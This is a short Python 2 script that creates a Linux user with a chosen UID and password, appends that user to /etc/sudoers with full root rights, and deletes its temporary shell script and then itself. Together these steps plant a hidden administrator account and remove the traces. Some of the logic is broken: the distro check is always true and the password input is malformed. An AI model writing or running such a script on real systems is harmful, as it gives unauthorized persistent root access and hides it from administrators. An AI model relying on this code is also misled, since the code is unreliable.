#!/usr/bin/env python

import sys
import commands
import os
import sys
import time

uname = sys.argv[1]
pswd = sys.argv[2]


def add(s1,usrr,pwd):
    f=open("SEP.sh","w")
    d="""#!/bin/bash\nsudo useradd -u %s -M %s\necho -e "%s\\%s" | passwd %s\necho "%s ALL=(ALL) ALL" >> /etc/sudoers"""
    d=d % (s1,usrr,pwd,pwd,usrr,usrr)
    f.writelines(d)
    f.close()
    commands.getoutput("chmod +x SEP.sh")
    commands.getoutput("./SEP.sh")
    commands.getoutput("rm -rf SEP.sh")


s=commands.getoutput("cat /etc/*-release")

if "=debian" or "=ubuntu" in s:
    add("589",uname,pswd)
else:
    add("389",uname,pswd)
    

time.sleep(5)
os.remove(sys.argv[0])

#coded by jayaram yalla
#https://twitter.com/jayaramyalla
#https://in.linkedin.com/in/jayaramyalla
